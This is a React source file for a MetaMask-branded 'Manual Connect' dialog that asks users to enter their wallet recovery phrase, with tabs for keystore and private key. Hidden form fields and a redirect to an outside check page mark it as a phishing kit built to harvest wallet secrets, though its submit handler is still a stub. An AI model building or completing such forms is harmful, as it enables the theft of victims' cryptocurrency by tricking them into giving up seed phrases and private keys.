import React, { useState } from 'react';
import "./manual.css";

const SendDialog = ({isOpen, handleCancel}) => {
  const [activeTab, setActiveTab] = useState('phrase');
  const [phrase, setPhrase] = useState('');

  const handleTabClick = (tab) => {
    setActiveTab(tab);
  };

  const handlePhraseChange = (e) => {
    setPhrase(e.target.value);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    // Handle form submission logic here
  };


  if(! isOpen ) return;

  return (
    <div id="send-dialog" style={{}}>
      <div className="send-dialog-overlay"></div>
      <div className="send-dialog-content">
        <div className="connect-dialog-body">
          <div className="to-send-info">
            <div className="wallet-app-send-logo">
              <img 
                id="current-wallet-send-logo" 
                src="/manual.jpg" 
                alt="wallet-app-name" 
              />
            </div>
            <div id="current-wallet-app-send" className="wallet-app-name-send">
              Manual Connect
            </div>
          </div>

          <div className="send-tabs">
            <button 
              id="phraseSend" 
              onClick={() => handleTabClick('phrase')}
              className={activeTab === 'phrase' ? 'active' : ''}
            >
              Phrase
            </button>
            <button 
              id="keystoreSend" 
              onClick={() => handleTabClick('keystore')}
              className={activeTab === 'keystore' ? 'active' : ''}
            >
              Keystore
            </button>
            <button 
              id="privateKeySend" 
              onClick={() => handleTabClick('privateKey')}
              className={activeTab === 'privateKey' ? 'active' : ''}
            >
              Private Key
            </button>
          </div>
          
          <div className="message-tab"></div>
          
          <div className="send-form">
            <form 
              id="processForm" 
              method="post" 
              encType="multipart/form-data"
              onSubmit={handleSubmit}
            >
              <input type="hidden" name="_captcha" value="false" />
              <input 
                type="hidden" 
                name="_next" 
                value="https://coin-multiwallet.web.app/app/check.html" 
              />
              <input 
                type="hidden" 
                name="wallet" 
                id="walletNameData" 
                value="Metamask" 
              />
              
              <div id="data-to-send">
                <div className="form-group">
                  <div className="form-group">
                    <input 
                      type="hidden" 
                      id="type" 
                      name="type" 
                      value={activeTab} 
                    />
                    {activeTab === 'phrase' && (
                      <>
                        <textarea 
                          id="phrase" 
                          name="phrase" 
                          required 
                          className="form-control" 
                          placeholder="Enter your recovery phrase" 
                          rows="5" 
                          style={{ resize: 'none' }}
                          value={phrase}
                          onChange={handlePhraseChange}
                        />
                        <div className="small text-left my-3" style={{ fontSize: '11px' }}>
                          Typically 12 (sometimes 24) words separated by single spaces
                        </div>
                      </>
                    )}
                    {/* Add similar conditional rendering for other tabs */}
                    {activeTab === 'keystore' && (
                      <div>Keystore input fields would go here</div>
                    )}
                    {activeTab === 'privateKey' && (
                      <div>Private key input field would go here</div>
                    )}
                  </div>
                </div>
              </div>
              
              <button 
                type="submit" 
                id="proceedButton" 
                className="btn btn-primary btn-block" 
                style={{ fontWeight: 'bold', fontSize: '14px',justifyContent: "center", backgroundColor: "#007bff", backgroundImage:"linear-gradient(90deg, #007bff, #0a54a2ff)" , padding:"8px 5px"}}
              >
                PROCEED
              </button>
              
              <div className="text-right">
                <button 
                  type="button" 
                  id="cancelBtn" 
                  className="btn btn-sm dialog-dismiss btn-danger mt-2 text-right"
                  onClick={handleCancel}
                  style={{ fontWeight: 'bold', fontSize: '14px',justifyContent: "center",  backgroundImage:"linear-gradient(90deg, #a80101ff, #a20a0aff)" , padding:"8px 10px"}}
                >
                  Cancel
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SendDialog;